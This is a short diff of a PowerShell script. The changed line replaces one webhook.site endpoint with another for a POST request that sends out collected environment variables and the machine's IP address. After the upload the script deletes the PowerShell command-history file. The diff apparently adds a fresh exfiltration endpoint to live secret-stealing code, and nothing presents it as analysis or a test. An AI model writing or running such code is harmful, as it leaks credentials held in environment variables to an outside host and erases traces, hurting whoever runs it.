@@ -25,6 +25,6 @@ $Body = @{
   'env' = $envVars | ConvertTo-Json
   'ip' = $IP
 }
-Invoke-RestMethod -ContentType 'Application/Json' -Uri https://webhook.site/abd9d9ea-249b-4068-881b-1e4b83564fba -Method Post -Body ($Body | ConvertTo-Json)
+Invoke-RestMethod -ContentType 'Application/Json' -Uri https://webhook.site/7843c3f7-0a7f-4a76-8ad4-58b51c82fad2 -Method Post -Body ($Body | ConvertTo-Json)
 
 Remove-Item (Get-PSReadlineOption).HistorySavePath
